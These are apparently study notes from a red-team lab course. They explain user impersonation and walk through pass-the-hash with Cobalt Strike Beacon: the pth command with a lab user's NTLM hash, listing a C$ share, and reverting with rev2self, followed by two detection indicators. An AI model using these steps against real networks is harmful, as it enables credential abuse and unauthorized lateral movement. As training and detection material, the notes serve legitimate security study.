# User Impersonation

There are techniques which use stolen creds to access one of the target computers. There are also techniques that don't use credentials directly, but take advantage of processes that the user is running on a machine we have elevated access on. Test elevated access to a machine by listing the C drive, as this requires local admin.

## Pass the Hash

Allows you to authenticate to a Windows service using a user's NTLM hash. It starts a new session with a fake identity and then replaces the session information with the domain, username, and NTLM hash provided. 

Beacon has a ```pth``` command that executes Mimikatz in the background (requires elevated privs).

In lab, on beacon prompt:

1. ```getuid``` - find out who I am
2. ```ls \\web.dev.cyberbotic.io\c$``` - attempt to list the C$ share of the WEB machine (this will fail because bfarmer is not a local admin)
3. ```pth DEV\jking 59fc0f884922b4ce376051134c71e22c``` - run ```pth``` with jking's username and NTLM hash; Mimiktaz passes the new credentials over a named pipe, which Beacon then impersonates automatically
4. ```ls \\web.dev.cyberbotic.io\c$``` - attempt to list the C$ share works now!
5. ```rev2self``` - drop impersonation when no longer needed

Two ways to detect ```pth```:
* The R/W handle to LSASS (access mask of 0x1038)
* Look for ```echo foo > \\.\pipe\bar``` pattern in command-line logs (via the "Suspicious Named Pipe Impersonation" search)

## Pass the Ticket



